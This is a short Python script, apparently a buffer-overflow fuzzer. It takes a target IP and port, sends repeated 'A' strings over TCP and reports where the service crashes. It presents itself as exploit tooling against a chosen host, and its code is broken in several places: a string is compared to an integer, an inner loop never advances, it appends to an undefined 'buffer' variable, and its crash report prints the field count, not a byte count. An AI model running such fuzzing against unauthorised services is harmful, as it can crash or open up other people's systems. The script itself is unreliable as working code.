#!/usr/bin/python
import sys, socket
from time import sleep

Target_Ip = input("Enter the targeting IP(default=192.168.1.1):") or "192.168.1.1"
Port = int(input("Enter the targeting Port(default=9999):") or 9999)
FieldsNumer = input("How many fields you have to fill(default=1):") or 1
Fields=[]
Field=0
while Field < FieldsNumer:
    print(Field)
    Fields.append(input("Enter the value of the field(default='A' * 100):") or 'A' * 100)
    print("the " + str(Field) + "field is " + Fields[Field])
    Field+=1

print("The target that you want to exploit by using the buffer overflow exploit is: "+Target_Ip+":"+str(Port))

while True:
    try:
        print("Connecting to the socket.....")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((Target_Ip,Port))
        while Field < FieldsNumer:
            print("Connecting to socket.....")
            print(Field)
            s.send((Fields[Field]))
            s.recv(1024)
        s.close()
        sleep(1)
        buffer = buffer + 'A' * 100
    except socket.error as msg:
        print(msg)
        print("Fuzzing crashed at " + str(len(Fields)) + " bytes")
        sys.exit()